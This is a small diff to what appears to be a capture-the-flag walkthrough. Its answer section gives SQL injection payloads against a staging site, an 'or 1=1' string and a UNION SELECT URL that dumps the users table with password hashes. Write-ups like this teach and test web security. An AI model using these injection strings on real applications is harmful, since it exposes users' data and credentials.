@@ -47,5 +47,6 @@ At the top right of the main courtyard, after thawing the Frost Tower door and f
 
 <details>
   <summary>Answer</summary>
-  While "/detail/1,1 or 1=1" will successfully return all uniquecontact details, a UNION-based SQL injection will give you all database user password hashes too! You can build this exploit by reviewing the database tables sourcecode. https://staging.jackfrosttower.com/detail/1,2,4%20union%20select%20*%20from%20users--
+  While "/detail/1,1 or 1=1" will successfully return all uniquecontact details, a UNION-based SQL injection will give you all database user password hashes too! You can build this exploit by reviewing the database tables sourcecode.
+  https://staging.jackfrosttower.com/detail/1,2,4%20union%20select%20*%20from%20users--
 </details>
